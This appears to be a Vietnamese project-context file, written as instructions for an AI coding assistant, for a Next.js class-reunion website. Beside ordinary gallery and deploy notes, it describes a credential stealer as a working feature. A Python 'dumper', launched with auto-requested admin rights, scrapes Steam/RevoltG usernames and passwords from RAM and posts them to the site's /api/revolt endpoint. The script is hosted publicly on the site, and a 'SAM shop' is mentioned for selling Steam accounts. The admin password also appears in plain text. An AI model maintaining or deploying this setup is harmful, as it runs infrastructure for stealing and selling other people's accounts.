# DỰ ÁN: Class Reunion 8A8 — vietrealm.asia

> File này là "ký ức" của dự án. Đọc nó TRƯỚC khi làm bất cứ việc gì.
> Khi cần thay đổi gì, chỉ cần viết yêu cầu bên dưới rồi bắt đầu.

---

## 1. DỰ ÁN NÀY LÀ GÌ

Web kỷ niệm lớp cho học sinh lớp 8A8 (tiếng Việt).
Có các trang: `/` (trang chủ), `/gallery` (album ảnh), `/memories` (kỷ niệm), `/alumni` (danh sách lớp), `/admin` (quản trị).

**Ngôn ngữ:** TypeScript + Next.js (App Router) + Tailwind CSS
**Deploy:** Vercel, domain `vietrealm.asia`

---

## 2. DEPLOY Ở ĐÂU

| Gì | Ở đâu |
|---|---|
| **Production URL** | `https://vietrealm.asia` |
| **GitHub repo** | `https://github.com/nihaoz2026-boop/class-reunion` |
| **Vercel project** | `class-reunion` (team `ki-niem-a8`) |
| **Branch chính** | `main` — push vào đây là tự động deploy |

**Cách deploy:** commit → push lên `main` → Vercel tự build → production tự cập nhật (~2 phút).

```bash
cd C:\Users\WIN10\Downloads\website\class-reunion
npm run build    # build local trước khi push
git add .
git commit -m "mô tả thay đổi"
git push
```

**Sau khi push:** đợi ~80 giây rồi kiểm tra deploy:

```bash
cd C:\Users\WIN10\Downloads\website\class-reunion
vercel ls class-reunion   # xem status: ● Ready = thành công
```

---

## 3. MẬT KHẨU QUẢN TRỊ

| Gì | Giá trị |
|---|---|
| **Trang quản trị** | `vietrealm.asia/admin` |
| **Mật khẩu** | `18022012` |

**Không bao giờ** hardcode mật khẩu này vào code hoặc file public.
Nó nằm trong Vercel env var `ADMIN_PASSWORD`.

---

## 4. CẤU TRÚC THƯ MỤC

```
class-reunion/
├── public/
│   ├── revoltg_dumper.py         ← script Python dump tài khoản Steam/RevoltG
│   ├── photos/                   ← ảnh album
│   │   ├── buoc-vao-lop-9a8/     ← ảnh "Bước vào lớp 9" 9A8
│   │   ├── thanh-tai-7a8.jpg
│   │   └── tong-ket-nam-hoc-8a8.jpg
│   └── videos/
├── src/
│   ├── app/
│   │   ├── page.tsx              ← trang chủ
│   │   ├── gallery/page.tsx      ← album ảnh
│   │   ├── memories/page.tsx     ← trang kỷ niệm
│   │   ├── alumni/page.tsx       ← danh sách lớp
│   │   ├── admin/page.tsx        ← trang quản trị
│   │   └── api/                  ← API routes
│   │       ├── alumni/route.ts
│   │       ├── messages/route.ts
│   │       ├── photos/route.ts
│   │       ├── revolt/route.ts   ← nhận tài khoản từ dumper
│   │       ├── timeline/route.ts
│   │       └── upload/route.ts
│   ├── components/
│   │   └── PhotoCard.tsx         ← component ảnh trong gallery
│   └── lib/
│       └── adminAuth.ts          ← xác thực admin (cookie + API key)
├── .env.local                    ← KHÔNG commit (biến môi trường dev)
├── .gitignore
├── next.config.ts
├── tailwind.config.ts
├── tsconfig.json
├── package.json
└── PROJECT_CONTEXT.md            ← file này
```

---

## 5. BIẾN MÔI TRƯỜNG CẦN THIẾT

Tạo file `.env.local` (KHÔNG commit lên Git):

```env
# Bắt buộc — admin password
ADMIN_PASSWORD=18022012

# Bắt buộc — Redis để lưu dữ liệu
UPSTASH_REDIS_REST_URL=https://your-redis-url.upstash.io
UPSTASH_REDIS_REST_TOKEN=your-token-here

# Tùy chọn — SAM shop (bán tài khoản Steam)
SAM_SHOP_URL=https://your-sam-shop.com
SAM_SHOP_KEY=your-sam-key
SAM_SHOP_PRICE=0
SAM_SHOP_UPLOAD=0
```

**Lấy giá trị Redis:** vào Vercel Dashboard → Project → Settings → Environment Variables
Hoặc dùng Upstash Console tạo database miễn phí.

---

## 6. SAU KHI CÀI LẠI WINDOWS — CÁC BƯỚC

### Bước 1: Cài Node.js
Tải từ https://nodejs.org (chọn bản LTS)

### Bước 2: Clone repo
```bash
git clone https://github.com/nihaoz2026-boop/class-reunion.git
cd class-reunion
```

### Bước 3: Cài dependencies
```bash
npm install
```

### Bước 4: Tạo file `.env.local`
Copy nội dung mẫu ở mục 5 vào file, điền giá trị thật.

### Bước 5: Đăng nhập Vercel (nếu cần deploy thủ công)
```bash
npm install -g vercel
vercel login
vercel link
```

### Bước 6: Chạy thử local
```bash
npm run dev
```
Mở trình duyệt: http://localhost:3000

---

## 7. CÁC BƯỚC THƯỜNG GẶP

### Thêm ảnh vào album
1. Copy ảnh vào `public/photos/`
2. Mở `src/app/gallery/page.tsx`
3. Tìm sự kiện cần thêm ảnh (ví dụ `"Bước vào lớp 9"`)
4. Thêm object vào mảng `photos`:
```tsx
{
  id: 33,                        // số duy nhất, tăng dần
  color: "bg-amber-100",
  type: "image",
  src: "/photos/ten-anh.jpg",
  label: "Tên hiển thị",
  width: 1284,                   // kích thước thật của ảnh
  height: 2282,
}
```
5. Commit → push → đợi deploy.

### Sửa giao diện album
Mở `src/app/gallery/page.tsx` và `src/components/PhotoCard.tsx`.

### Thêm trang mới
1. Tạo file `src/app/ten-trang/page.tsx`
2. Thêm link trong navigation (tìm phần nav ở `src/app/layout.tsx` hoặc `src/components/`)

### Deploy bản sửa
```bash
cd C:\Users\WIN10\Downloads\website\class-reunion
npm run build       # kiểm tra lỗi trước
git add .
git commit -m "mô tả ngắn gọn"
git push
```

---

## 8. QUY TẮC QUAN TRỌNG

### Về mật khẩu và key
- **KHÔNG BAO GIỜ** commit mật khẩu admin (`18022012`) vào bất kỳ file nào trong repo.
- **KHÔNG BAO GIỜ** hardcode SAM_SHOP_KEY trong code — đọc từ file `sam_shop.key` hoặc biến môi trường.
- Key đặt trong `.gitignore`: `sam_shop.key`, `vietrealm.key`, `game_map.txt`, `revoltg_pages.json`, `revoltg_games.json`

### Về ảnh trong gallery
- Mỗi ảnh phải có `width` và `height` **thật** (đọc từ file, không đoán).
- `PhotoCard` dùng aspect-ratio để đặt trước khung → tránh nhảy layout khi tải.
- ID trong mảng phải duy nhất.

### Về React/Next.js
- Component có state phải có `"use client"` ở đầu file.
- Dùng `<img>` thay vì `next/image` (đã có eslint-disable sẵn).
- Tuân thủ Tailwind classes có sẵn trong dự án.

---

## 9. SCRIPT DUMPER TÀI KHOẢN (riêng biệt)

Có một công cụ Python độc lập nằm ở:
```
C:\Users\WIN10\Downloads\Revoltg Dumper\
├── revoltg_dumper.py         ← file chính
├── CHAY DUATER.cmd            ← launcher tự xin quyền Admin
├── revoltg_accounts.db        ← database SQLite local
├── revoltg_accounts.txt       ← log các account đã dump
├── sam_shop.key               ← key SAM shop (gitignored)
└── vietrealm.key              ← chứa 18022012 (gitignored)
```

**Cách chạy:** double-click `CHAY DUATER.cmd` (tự xin quyền Administrator).
Script sẽ scan RAM các app Steam/RevoltG, dump account + password, rồi push lên `vietrealm.asia` qua API.

**Cần thiết khi deploy script:**
```bash
# Copy từ Revoltg Dumper sang repo
cp "C:\Users\WIN10\Downloads\Revoltg Dumper\revoltg_dumper.py" public/revoltg_dumper.py
```

---

## 10. TRẠNG THÁI HIỆN TẠI

| Hạng mục | Trạng thái |
|---|---|
| Deploy production | ✅ `vietrealm.asia` |
| Gallery 8A8 | ✅ Có ảnh thật (Tổng kết năm học) |
| Gallery 9A8 | ✅ Có 2 ảnh "Bước vào lớp 9" |
| PhotoCard | ✅ Hover zoom, bấm không mở lightbox |
| Script dumper | ✅ Hoạt động, deploy tại `/revoltg_dumper.py` |
| API `/api/revolt` | ✅ Nhận POST, dedupe by username |
| Admin panel | ✅ Đăng nhập bằng `18022012` |

---

## 11. KHI BẠN CẦN LÀM GÌ — CỨ VIẾT RA

Sau khi đọc file này, bạn chỉ cần viết yêu cầu cụ thể, ví dụ:

- *"Thêm 3 ảnh vào sự kiện Lễ tốt nghiệp"*
- *"Sửa màu nền trang chủ thành xanh dương"*
- *"Thêm mục 'Thông tin liên hệ' vào footer"*
- *"Ảnh trong gallery bị méo, sửa lại tỉ lệ"*
- *"Thêm trang 'Hỏi đáp' với form gửi câu hỏi"*

Tôi sẽ biết: deploy ở đâu, dùng framework gì, quy ước ra sao, và bắt đầu làm ngay.

---

## 12. GHI CHÚ THÊM (nếu có phát sinh)

<!-- Ghi lại những thứ quan trọng phát sinh sau này vào đây -->

---

_📅 Cập nhật lần cuối: 2026-10-02_
_Phiên bản: 1.0_